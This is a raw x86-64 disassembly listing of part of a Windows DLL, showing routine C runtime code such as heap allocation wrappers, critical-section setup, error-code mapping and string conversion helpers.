   180007fc5:	33 c9                	xor    %ecx,%ecx
   180007fc7:	e8 c8 02 00 00       	call   0x180008294
   180007fcc:	48 8b f7             	mov    %rdi,%rsi
   180007fcf:	8b cb                	mov    %ebx,%ecx
   180007fd1:	ff 15 f1 80 00 00    	call   *0x80f1(%rip)        # 0x1800100c8
   180007fd7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007fdc:	48 f7 df             	neg    %rdi
   180007fdf:	48 1b c0             	sbb    %rax,%rax
   180007fe2:	48 23 c6             	and    %rsi,%rax
   180007fe5:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180007fea:	48 83 c4 20          	add    $0x20,%rsp
   180007fee:	5f                   	pop    %rdi
   180007fef:	c3                   	ret
   180007ff0:	48 83 ec 28          	sub    $0x28,%rsp
   180007ff4:	48 8d 0d e9 fb ff ff 	lea    -0x417(%rip),%rcx        # 0x180007be4
   180007ffb:	e8 ec 1e 00 00       	call   0x180009eec
   180008000:	89 05 4a 20 01 00    	mov    %eax,0x1204a(%rip)        # 0x18001a050
   180008006:	83 f8 ff             	cmp    $0xffffffff,%eax
   180008009:	75 04                	jne    0x18000800f
   18000800b:	32 c0                	xor    %al,%al
   18000800d:	eb 15                	jmp    0x180008024
   18000800f:	e8 10 ff ff ff       	call   0x180007f24
   180008014:	48 85 c0             	test   %rax,%rax
   180008017:	75 09                	jne    0x180008022
   180008019:	33 c9                	xor    %ecx,%ecx
   18000801b:	e8 0c 00 00 00       	call   0x18000802c
   180008020:	eb e9                	jmp    0x18000800b
   180008022:	b0 01                	mov    $0x1,%al
   180008024:	48 83 c4 28          	add    $0x28,%rsp
   180008028:	c3                   	ret
   180008029:	cc                   	int3
   18000802a:	cc                   	int3
   18000802b:	cc                   	int3
   18000802c:	48 83 ec 28          	sub    $0x28,%rsp
   180008030:	8b 0d 1a 20 01 00    	mov    0x1201a(%rip),%ecx        # 0x18001a050
   180008036:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180008039:	74 0c                	je     0x180008047
   18000803b:	e8 f4 1e 00 00       	call   0x180009f34
   180008040:	83 0d 09 20 01 00 ff 	orl    $0xffffffff,0x12009(%rip)        # 0x18001a050
   180008047:	b0 01                	mov    $0x1,%al
   180008049:	48 83 c4 28          	add    $0x28,%rsp
   18000804d:	c3                   	ret
   18000804e:	cc                   	int3
   18000804f:	cc                   	int3
   180008050:	40 53                	rex push %rbx
   180008052:	48 83 ec 20          	sub    $0x20,%rsp
   180008056:	33 db                	xor    %ebx,%ebx
   180008058:	48 8d 15 81 33 01 00 	lea    0x13381(%rip),%rdx        # 0x18001b3e0
   18000805f:	45 33 c0             	xor    %r8d,%r8d
   180008062:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   180008066:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   18000806a:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   18000806f:	e8 a4 1f 00 00       	call   0x18000a018
   180008074:	85 c0                	test   %eax,%eax
   180008076:	74 11                	je     0x180008089
   180008078:	ff 05 92 35 01 00    	incl   0x13592(%rip)        # 0x18001b610
   18000807e:	ff c3                	inc    %ebx
   180008080:	83 fb 0e             	cmp    $0xe,%ebx
   180008083:	72 d3                	jb     0x180008058
   180008085:	b0 01                	mov    $0x1,%al
   180008087:	eb 09                	jmp    0x180008092
   180008089:	33 c9                	xor    %ecx,%ecx
   18000808b:	e8 24 00 00 00       	call   0x1800080b4
   180008090:	32 c0                	xor    %al,%al
   180008092:	48 83 c4 20          	add    $0x20,%rsp
   180008096:	5b                   	pop    %rbx
   180008097:	c3                   	ret
   180008098:	48 63 c1             	movslq %ecx,%rax
   18000809b:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   18000809f:	48 8d 05 3a 33 01 00 	lea    0x1333a(%rip),%rax        # 0x18001b3e0
   1800080a6:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1800080aa:	48 ff 25 27 80 00 00 	rex.W jmp *0x8027(%rip)        # 0x1800100d8
   1800080b1:	cc                   	int3
   1800080b2:	cc                   	int3
   1800080b3:	cc                   	int3
   1800080b4:	40 53                	rex push %rbx
   1800080b6:	48 83 ec 20          	sub    $0x20,%rsp
   1800080ba:	8b 1d 50 35 01 00    	mov    0x13550(%rip),%ebx        # 0x18001b610
   1800080c0:	eb 1d                	jmp    0x1800080df
   1800080c2:	48 8d 05 17 33 01 00 	lea    0x13317(%rip),%rax        # 0x18001b3e0
   1800080c9:	ff cb                	dec    %ebx
   1800080cb:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   1800080cf:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1800080d3:	ff 15 0f 80 00 00    	call   *0x800f(%rip)        # 0x1800100e8
   1800080d9:	ff 0d 31 35 01 00    	decl   0x13531(%rip)        # 0x18001b610
   1800080df:	85 db                	test   %ebx,%ebx
   1800080e1:	75 df                	jne    0x1800080c2
   1800080e3:	b0 01                	mov    $0x1,%al
   1800080e5:	48 83 c4 20          	add    $0x20,%rsp
   1800080e9:	5b                   	pop    %rbx
   1800080ea:	c3                   	ret
   1800080eb:	cc                   	int3
   1800080ec:	48 63 c1             	movslq %ecx,%rax
   1800080ef:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1800080f3:	48 8d 05 e6 32 01 00 	lea    0x132e6(%rip),%rax        # 0x18001b3e0
   1800080fa:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1800080fe:	48 ff 25 db 7f 00 00 	rex.W jmp *0x7fdb(%rip)        # 0x1800100e0
   180008105:	cc                   	int3
   180008106:	cc                   	int3
   180008107:	cc                   	int3
   180008108:	40 53                	rex push %rbx
   18000810a:	48 83 ec 20          	sub    $0x20,%rsp
   18000810e:	33 db                	xor    %ebx,%ebx
   180008110:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180008114:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   18000811b:	00 00 
   18000811d:	48 8b 48 20          	mov    0x20(%rax),%rcx
   180008121:	39 59 08             	cmp    %ebx,0x8(%rcx)
   180008124:	7c 11                	jl     0x180008137
   180008126:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000812b:	e8 30 1d 00 00       	call   0x180009e60
   180008130:	83 7c 24 30 01       	cmpl   $0x1,0x30(%rsp)
   180008135:	74 05                	je     0x18000813c
   180008137:	bb 01 00 00 00       	mov    $0x1,%ebx
   18000813c:	8b c3                	mov    %ebx,%eax
   18000813e:	48 83 c4 20          	add    $0x20,%rsp
   180008142:	5b                   	pop    %rbx
   180008143:	c3                   	ret
   180008144:	33 c0                	xor    %eax,%eax
   180008146:	4c 8d 0d 63 94 00 00 	lea    0x9463(%rip),%r9        # 0x1800115b0
   18000814d:	49 8b d1             	mov    %r9,%rdx
   180008150:	44 8d 40 08          	lea    0x8(%rax),%r8d
   180008154:	3b 0a                	cmp    (%rdx),%ecx
   180008156:	74 2b                	je     0x180008183
   180008158:	ff c0                	inc    %eax
   18000815a:	49 03 d0             	add    %r8,%rdx
   18000815d:	83 f8 2d             	cmp    $0x2d,%eax
   180008160:	72 f2                	jb     0x180008154
   180008162:	8d 41 ed             	lea    -0x13(%rcx),%eax
   180008165:	83 f8 11             	cmp    $0x11,%eax
   180008168:	77 06                	ja     0x180008170
   18000816a:	b8 0d 00 00 00       	mov    $0xd,%eax
   18000816f:	c3                   	ret
   180008170:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   180008176:	b8 16 00 00 00       	mov    $0x16,%eax
   18000817b:	83 f9 0e             	cmp    $0xe,%ecx
   18000817e:	41 0f 46 c0          	cmovbe %r8d,%eax
   180008182:	c3                   	ret
   180008183:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   180008188:	c3                   	ret
   180008189:	cc                   	int3
   18000818a:	cc                   	int3
   18000818b:	cc                   	int3
   18000818c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008191:	57                   	push   %rdi
   180008192:	48 83 ec 20          	sub    $0x20,%rsp
   180008196:	8b f9                	mov    %ecx,%edi
   180008198:	e8 87 fd ff ff       	call   0x180007f24
   18000819d:	48 85 c0             	test   %rax,%rax
   1800081a0:	75 09                	jne    0x1800081ab
   1800081a2:	48 8d 05 af 1e 01 00 	lea    0x11eaf(%rip),%rax        # 0x18001a058
   1800081a9:	eb 04                	jmp    0x1800081af
   1800081ab:	48 83 c0 24          	add    $0x24,%rax
   1800081af:	89 38                	mov    %edi,(%rax)
   1800081b1:	e8 6e fd ff ff       	call   0x180007f24
   1800081b6:	48 8d 1d 97 1e 01 00 	lea    0x11e97(%rip),%rbx        # 0x18001a054
   1800081bd:	48 85 c0             	test   %rax,%rax
   1800081c0:	74 04                	je     0x1800081c6
   1800081c2:	48 8d 58 20          	lea    0x20(%rax),%rbx
   1800081c6:	8b cf                	mov    %edi,%ecx
   1800081c8:	e8 77 ff ff ff       	call   0x180008144
   1800081cd:	89 03                	mov    %eax,(%rbx)
   1800081cf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800081d4:	48 83 c4 20          	add    $0x20,%rsp
   1800081d8:	5f                   	pop    %rdi
   1800081d9:	c3                   	ret
   1800081da:	cc                   	int3
   1800081db:	cc                   	int3
   1800081dc:	48 83 ec 28          	sub    $0x28,%rsp
   1800081e0:	e8 3f fd ff ff       	call   0x180007f24
   1800081e5:	48 85 c0             	test   %rax,%rax
   1800081e8:	75 09                	jne    0x1800081f3
   1800081ea:	48 8d 05 67 1e 01 00 	lea    0x11e67(%rip),%rax        # 0x18001a058
   1800081f1:	eb 04                	jmp    0x1800081f7
   1800081f3:	48 83 c0 24          	add    $0x24,%rax
   1800081f7:	48 83 c4 28          	add    $0x28,%rsp
   1800081fb:	c3                   	ret
   1800081fc:	48 83 ec 28          	sub    $0x28,%rsp
   180008200:	e8 1f fd ff ff       	call   0x180007f24
   180008205:	48 85 c0             	test   %rax,%rax
   180008208:	75 09                	jne    0x180008213
   18000820a:	48 8d 05 43 1e 01 00 	lea    0x11e43(%rip),%rax        # 0x18001a054
   180008211:	eb 04                	jmp    0x180008217
   180008213:	48 83 c0 20          	add    $0x20,%rax
   180008217:	48 83 c4 28          	add    $0x28,%rsp
   18000821b:	c3                   	ret
   18000821c:	40 53                	rex push %rbx
   18000821e:	48 83 ec 20          	sub    $0x20,%rsp
   180008222:	4c 8b c2             	mov    %rdx,%r8
   180008225:	48 8b d9             	mov    %rcx,%rbx
   180008228:	48 85 c9             	test   %rcx,%rcx
   18000822b:	74 0e                	je     0x18000823b
   18000822d:	33 d2                	xor    %edx,%edx
   18000822f:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   180008233:	48 f7 f3             	div    %rbx
   180008236:	49 3b c0             	cmp    %r8,%rax
   180008239:	72 43                	jb     0x18000827e
   18000823b:	49 0f af d8          	imul   %r8,%rbx
   18000823f:	b8 01 00 00 00       	mov    $0x1,%eax
   180008244:	48 85 db             	test   %rbx,%rbx
   180008247:	48 0f 44 d8          	cmove  %rax,%rbx
   18000824b:	eb 15                	jmp    0x180008262
   18000824d:	e8 26 32 00 00       	call   0x18000b478
   180008252:	85 c0                	test   %eax,%eax
   180008254:	74 28                	je     0x18000827e
   180008256:	48 8b cb             	mov    %rbx,%rcx
   180008259:	e8 32 f4 ff ff       	call   0x180007690
   18000825e:	85 c0                	test   %eax,%eax
   180008260:	74 1c                	je     0x18000827e
   180008262:	48 8b 0d b7 35 01 00 	mov    0x135b7(%rip),%rcx        # 0x18001b820
   180008269:	4c 8b c3             	mov    %rbx,%r8
   18000826c:	ba 08 00 00 00       	mov    $0x8,%edx
   180008271:	ff 15 d1 7e 00 00    	call   *0x7ed1(%rip)        # 0x180010148
   180008277:	48 85 c0             	test   %rax,%rax
   18000827a:	74 d1                	je     0x18000824d
   18000827c:	eb 0d                	jmp    0x18000828b
   18000827e:	e8 79 ff ff ff       	call   0x1800081fc
   180008283:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   180008289:	33 c0                	xor    %eax,%eax
   18000828b:	48 83 c4 20          	add    $0x20,%rsp
   18000828f:	5b                   	pop    %rbx
   180008290:	c3                   	ret
   180008291:	cc                   	int3
   180008292:	cc                   	int3
   180008293:	cc                   	int3
   180008294:	48 85 c9             	test   %rcx,%rcx
   180008297:	74 37                	je     0x1800082d0
   180008299:	53                   	push   %rbx
   18000829a:	48 83 ec 20          	sub    $0x20,%rsp
   18000829e:	4c 8b c1             	mov    %rcx,%r8
   1800082a1:	33 d2                	xor    %edx,%edx
   1800082a3:	48 8b 0d 76 35 01 00 	mov    0x13576(%rip),%rcx        # 0x18001b820
   1800082aa:	ff 15 a0 7e 00 00    	call   *0x7ea0(%rip)        # 0x180010150
   1800082b0:	85 c0                	test   %eax,%eax
   1800082b2:	75 17                	jne    0x1800082cb
   1800082b4:	e8 43 ff ff ff       	call   0x1800081fc
   1800082b9:	48 8b d8             	mov    %rax,%rbx
   1800082bc:	ff 15 fe 7d 00 00    	call   *0x7dfe(%rip)        # 0x1800100c0
   1800082c2:	8b c8                	mov    %eax,%ecx
   1800082c4:	e8 7b fe ff ff       	call   0x180008144
   1800082c9:	89 03                	mov    %eax,(%rbx)
   1800082cb:	48 83 c4 20          	add    $0x20,%rsp
   1800082cf:	5b                   	pop    %rbx
   1800082d0:	c3                   	ret
   1800082d1:	cc                   	int3
   1800082d2:	cc                   	int3
   1800082d3:	cc                   	int3
   1800082d4:	48 3b ca             	cmp    %rdx,%rcx
   1800082d7:	73 04                	jae    0x1800082dd
   1800082d9:	83 c8 ff             	or     $0xffffffff,%eax
   1800082dc:	c3                   	ret
   1800082dd:	33 c0                	xor    %eax,%eax
   1800082df:	48 3b ca             	cmp    %rdx,%rcx
   1800082e2:	0f 97 c0             	seta   %al
   1800082e5:	c3                   	ret
   1800082e6:	cc                   	int3
   1800082e7:	cc                   	int3
   1800082e8:	48 8b c4             	mov    %rsp,%rax
   1800082eb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1800082ef:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1800082f3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1800082f7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1800082fb:	41 56                	push   %r14
   1800082fd:	48 83 ec 30          	sub    $0x30,%rsp
   180008301:	33 db                	xor    %ebx,%ebx
   180008303:	41 8b e8             	mov    %r8d,%ebp
   180008306:	48 8b fa             	mov    %rdx,%rdi
   180008309:	48 8b f1             	mov    %rcx,%rsi
   18000830c:	48 85 c9             	test   %rcx,%rcx
   18000830f:	75 22                	jne    0x180008333
   180008311:	38 5a 28             	cmp    %bl,0x28(%rdx)
   180008314:	74 0c                	je     0x180008322
   180008316:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   18000831a:	e8 75 ff ff ff       	call   0x180008294
   18000831f:	88 5f 28             	mov    %bl,0x28(%rdi)
   180008322:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   180008326:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   18000832a:	48 89 5f 20          	mov    %rbx,0x20(%rdi)
   18000832e:	e9 0e 01 00 00       	jmp    0x180008441
   180008333:	38 19                	cmp    %bl,(%rcx)
   180008335:	75 55                	jne    0x18000838c
   180008337:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   18000833b:	75 46                	jne    0x180008383
   18000833d:	38 5a 28             	cmp    %bl,0x28(%rdx)
   180008340:	74 0c                	je     0x18000834e
   180008342:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   180008346:	e8 49 ff ff ff       	call   0x180008294
   18000834b:	88 5f 28             	mov    %bl,0x28(%rdi)
   18000834e:	b9 02 00 00 00       	mov    $0x2,%ecx
   180008353:	e8 c0 29 00 00       	call   0x18000ad18
   180008358:	48 89 47 10          	mov    %rax,0x10(%rdi)
   18000835c:	48 8b cb             	mov    %rbx,%rcx
   18000835f:	48 f7 d8             	neg    %rax
   180008362:	1b d2                	sbb    %edx,%edx
   180008364:	f7 d2                	not    %edx
   180008366:	83 e2 0c             	and    $0xc,%edx
   180008369:	0f 94 c1             	sete   %cl
   18000836c:	85 d2                	test   %edx,%edx
   18000836e:	0f 94 c0             	sete   %al
   180008371:	88 47 28             	mov    %al,0x28(%rdi)
   180008374:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   180008378:	85 d2                	test   %edx,%edx
   18000837a:	74 07                	je     0x180008383
   18000837c:	8b da                	mov    %edx,%ebx
   18000837e:	e9 be 00 00 00       	jmp    0x180008441
   180008383:	48 8b 47 10          	mov    0x10(%rdi),%rax
   180008387:	66 89 18             	mov    %bx,(%rax)
   18000838a:	eb 9e                	jmp    0x18000832a
   18000838c:	41 83 c9 ff          	or     $0xffffffff,%r9d
   180008390:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   180008394:	4c 8b c6             	mov    %rsi,%r8
   180008397:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000839c:	8b cd                	mov    %ebp,%ecx
   18000839e:	41 8d 51 0a          	lea    0xa(%r9),%edx
   1800083a2:	e8 39 16 00 00       	call   0x1800099e0
   1800083a7:	4c 63 f0             	movslq %eax,%r14
   1800083aa:	85 c0                	test   %eax,%eax
   1800083ac:	75 16                	jne    0x1800083c4
   1800083ae:	ff 15 0c 7d 00 00    	call   *0x7d0c(%rip)        # 0x1800100c0
   1800083b4:	8b c8                	mov    %eax,%ecx
   1800083b6:	e8 d1 fd ff ff       	call   0x18000818c
   1800083bb:	e8 3c fe ff ff       	call   0x1800081fc
   1800083c0:	8b 18                	mov    (%rax),%ebx
   1800083c2:	eb 7d                	jmp    0x180008441
   1800083c4:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   1800083c8:	4c 3b f1             	cmp    %rcx,%r14
   1800083cb:	76 43                	jbe    0x180008410
   1800083cd:	38 5f 28             	cmp    %bl,0x28(%rdi)
   1800083d0:	74 0c                	je     0x1800083de
   1800083d2:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   1800083d6:	e8 b9 fe ff ff       	call   0x180008294
   1800083db:	88 5f 28             	mov    %bl,0x28(%rdi)
   1800083de:	4b 8d 0c 36          	lea    (%r14,%r14,1),%rcx
   1800083e2:	e8 31 29 00 00       	call   0x18000ad18
   1800083e7:	48 89 47 10          	mov    %rax,0x10(%rdi)
   1800083eb:	48 8b cb             	mov    %rbx,%rcx
   1800083ee:	48 f7 d8             	neg    %rax
   1800083f1:	1b d2                	sbb    %edx,%edx
   1800083f3:	f7 d2                	not    %edx
   1800083f5:	83 e2 0c             	and    $0xc,%edx
   1800083f8:	49 0f 44 ce          	cmove  %r14,%rcx
   1800083fc:	85 d2                	test   %edx,%edx
   1800083fe:	0f 94 c0             	sete   %al
   180008401:	88 47 28             	mov    %al,0x28(%rdi)
   180008404:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   180008408:	85 d2                	test   %edx,%edx
   18000840a:	0f 85 6c ff ff ff    	jne    0x18000837c
   180008410:	48 8b 47 10          	mov    0x10(%rdi),%rax
   180008414:	41 83 c9 ff          	or     $0xffffffff,%r9d
   180008418:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   18000841c:	4c 8b c6             	mov    %rsi,%r8
   18000841f:	8b cd                	mov    %ebp,%ecx
   180008421:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180008426:	41 8d 51 0a          	lea    0xa(%r9),%edx
   18000842a:	e8 b1 15 00 00       	call   0x1800099e0
   18000842f:	48 63 c8             	movslq %eax,%rcx
   180008432:	85 c0                	test   %eax,%eax
   180008434:	0f 84 74 ff ff ff    	je     0x1800083ae
   18000843a:	48 ff c9             	dec    %rcx
   18000843d:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   180008441:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   180008446:	8b c3                	mov    %ebx,%eax
   180008448:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000844d:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180008452:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   180008457:	48 83 c4 30          	add    $0x30,%rsp
   18000845b:	41 5e                	pop    %r14
   18000845d:	c3                   	ret
   18000845e:	cc                   	int3
   18000845f:	cc                   	int3
   180008460:	48 8b c4             	mov    %rsp,%rax
   180008463:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180008467:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000846b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000846f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180008473:	41 56                	push   %r14
   180008475:	48 83 ec 40          	sub    $0x40,%rsp
   180008479:	33 db                	xor    %ebx,%ebx
   18000847b:	45 8b f0             	mov    %r8d,%r14d
   18000847e:	48 8b fa             	mov    %rdx,%rdi
   180008481:	48 8b f1             	mov    %rcx,%rsi
   180008484:	48 85 c9             	test   %rcx,%rcx
   180008487:	75 22                	jne    0x1800084ab
   180008489:	38 5a 28             	cmp    %bl,0x28(%rdx)
   18000848c:	74 0c                	je     0x18000849a
   18000848e:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   180008492:	e8 fd fd ff ff       	call   0x180008294
   180008497:	88 5f 28             	mov    %bl,0x28(%rdi)
   18000849a:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   18000849e:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   1800084a2:	48 89 5f 20          	mov    %rbx,0x20(%rdi)
   1800084a6:	e9 22 01 00 00       	jmp    0x1800085cd
   1800084ab:	66 39 19             	cmp    %bx,(%rcx)
   1800084ae:	75 54                	jne    0x180008504
   1800084b0:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   1800084b4:	75 46                	jne    0x1800084fc
   1800084b6:	38 5a 28             	cmp    %bl,0x28(%rdx)
   1800084b9:	74 0c                	je     0x1800084c7
   1800084bb:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   1800084bf:	e8 d0 fd ff ff       	call   0x180008294
   1800084c4:	88 5f 28             	mov    %bl,0x28(%rdi)
   1800084c7:	b9 01 00 00 00       	mov    $0x1,%ecx
   1800084cc:	e8 47 28 00 00       	call   0x18000ad18
   1800084d1:	48 89 47 10          	mov    %rax,0x10(%rdi)
   1800084d5:	48 8b cb             	mov    %rbx,%rcx
   1800084d8:	48 f7 d8             	neg    %rax
   1800084db:	1b d2                	sbb    %edx,%edx
   1800084dd:	f7 d2                	not    %edx
   1800084df:	83 e2 0c             	and    $0xc,%edx
   1800084e2:	0f 94 c1             	sete   %cl
   1800084e5:	85 d2                	test   %edx,%edx
   1800084e7:	0f 94 c0             	sete   %al
   1800084ea:	88 47 28             	mov    %al,0x28(%rdi)
   1800084ed:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   1800084f1:	85 d2                	test   %edx,%edx
   1800084f3:	74 07                	je     0x1800084fc
   1800084f5:	8b da                	mov    %edx,%ebx
   1800084f7:	e9 d1 00 00 00       	jmp    0x1800085cd
   1800084fc:	48 8b 47 10          	mov    0x10(%rdi),%rax
   180008500:	88 18                	mov    %bl,(%rax)
   180008502:	eb 9e                	jmp    0x1800084a2
   180008504:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180008509:	41 83 c9 ff          	or     $0xffffffff,%r9d
   18000850d:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180008512:	4c 8b c6             	mov    %rsi,%r8
   180008515:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   180008519:	33 d2                	xor    %edx,%edx
   18000851b:	41 8b ce             	mov    %r14d,%ecx
   18000851e:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180008523:	e8 14 15 00 00       	call   0x180009a3c
   180008528:	48 63 e8             	movslq %eax,%rbp
   18000852b:	85 c0                	test   %eax,%eax
   18000852d:	75 19                	jne    0x180008548
   18000852f:	ff 15 8b 7b 00 00    	call   *0x7b8b(%rip)        # 0x1800100c0
   180008535:	8b c8                	mov    %eax,%ecx
   180008537:	e8 50 fc ff ff       	call   0x18000818c
   18000853c:	e8 bb fc ff ff       	call   0x1800081fc
   180008541:	8b 18                	mov    (%rax),%ebx
   180008543:	e9 85 00 00 00       	jmp    0x1800085cd
   180008548:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   18000854c:	48 3b e9             	cmp    %rcx,%rbp
   18000854f:	76 42                	jbe    0x180008593
   180008551:	38 5f 28             	cmp    %bl,0x28(%rdi)
   180008554:	74 0c                	je     0x180008562
   180008556:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   18000855a:	e8 35 fd ff ff       	call   0x180008294
   18000855f:	88 5f 28             	mov    %bl,0x28(%rdi)
   180008562:	48 8b cd             	mov    %rbp,%rcx
   180008565:	e8 ae 27 00 00       	call   0x18000ad18
   18000856a:	48 89 47 10          	mov    %rax,0x10(%rdi)
   18000856e:	48 8b cb             	mov    %rbx,%rcx
   180008571:	48 f7 d8             	neg    %rax
   180008574:	1b d2                	sbb    %edx,%edx
   180008576:	f7 d2                	not    %edx
   180008578:	83 e2 0c             	and    $0xc,%edx
   18000857b:	48 0f 44 cd          	cmove  %rbp,%rcx
   18000857f:	85 d2                	test   %edx,%edx
   180008581:	0f 94 c0             	sete   %al
   180008584:	88 47 28             	mov    %al,0x28(%rdi)
   180008587:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   18000858b:	85 d2                	test   %edx,%edx
   18000858d:	0f 85 62 ff ff ff    	jne    0x1800084f5
   180008593:	48 8b 47 10          	mov    0x10(%rdi),%rax
   180008597:	41 83 c9 ff          	or     $0xffffffff,%r9d
   18000859b:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1800085a0:	4c 8b c6             	mov    %rsi,%r8
   1800085a3:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1800085a8:	33 d2                	xor    %edx,%edx
   1800085aa:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   1800085ae:	41 8b ce             	mov    %r14d,%ecx
   1800085b1:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800085b6:	e8 81 14 00 00       	call   0x180009a3c
   1800085bb:	48 63 c8             	movslq %eax,%rcx
   1800085be:	85 c0                	test   %eax,%eax
   1800085c0:	0f 84 69 ff ff ff    	je     0x18000852f
   1800085c6:	48 ff c9             	dec    %rcx
   1800085c9:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   1800085cd:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1800085d2:	8b c3                	mov    %ebx,%eax
   1800085d4:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1800085d9:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1800085de:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   1800085e3:	48 83 c4 40          	add    $0x40,%rsp
   1800085e7:	41 5e                	pop    %r14
   1800085e9:	c3                   	ret
   1800085ea:	cc                   	int3
   1800085eb:	cc                   	int3
   1800085ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800085f1:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1800085f6:	55                   	push   %rbp
   1800085f7:	56                   	push   %rsi
   1800085f8:	57                   	push   %rdi
   1800085f9:	41 54                	push   %r12
   1800085fb:	41 55                	push   %r13
   1800085fd:	41 56                	push   %r14
   1800085ff:	41 57                	push   %r15
   180008601:	48 8b ec             	mov    %rsp,%rbp
   180008604:	48 83 ec 60          	sub    $0x60,%rsp
   180008608:	33 ff                	xor    %edi,%edi
   18000860a:	48 8b d9             	mov    %rcx,%rbx
   18000860d:	48 85 d2             	test   %rdx,%rdx
   180008610:	75 16                	jne    0x180008628
   180008612:	e8 e5 fb ff ff       	call   0x1800081fc
   180008617:	8d 5f 16             	lea    0x16(%rdi),%ebx
   18000861a:	89 18                	mov    %ebx,(%rax)
   18000861c:	e8 1b e0 ff ff       	call   0x18000663c
   180008621:	8b c3                	mov    %ebx,%eax
   180008623:	e9 a0 01 00 00       	jmp    0x1800087c8
   180008628:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000862b:	48 89 3a             	mov    %rdi,(%rdx)
   18000862e:	48 8b 01             	mov    (%rcx),%rax
   180008631:	f3 0f 7f 45 e0       	movdqu %xmm0,-0x20(%rbp)
   180008636:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
   18000863a:	48 85 c0             	test   %rax,%rax
   18000863d:	74 56                	je     0x180008695
   18000863f:	48 8d 55 50          	lea    0x50(%rbp),%rdx
   180008643:	66 c7 45 50 2a 3f    	movw   $0x3f2a,0x50(%rbp)
   180008649:	48 8b c8             	mov    %rax,%rcx
   18000864c:	40 88 7d 52          	mov    %dil,0x52(%rbp)
   180008650:	e8 4b 33 00 00       	call   0x18000b9a0
   180008655:	48 8b 0b             	mov    (%rbx),%rcx
   180008658:	48 85 c0             	test   %rax,%rax
   18000865b:	75 10                	jne    0x18000866d
   18000865d:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   180008661:	45 33 c0             	xor    %r8d,%r8d
   180008664:	33 d2                	xor    %edx,%edx
   180008666:	e8 8d 01 00 00       	call   0x1800087f8
   18000866b:	eb 0c                	jmp    0x180008679
   18000866d:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   180008671:	48 8b d0             	mov    %rax,%rdx
   180008674:	e8 07 03 00 00       	call   0x180008980
   180008679:	8b f0                	mov    %eax,%esi
   18000867b:	85 c0                	test   %eax,%eax
   18000867d:	75 09                	jne    0x180008688
   18000867f:	48 83 c3 08          	add    $0x8,%rbx
   180008683:	48 8b 03             	mov    (%rbx),%rax
   180008686:	eb b2                	jmp    0x18000863a
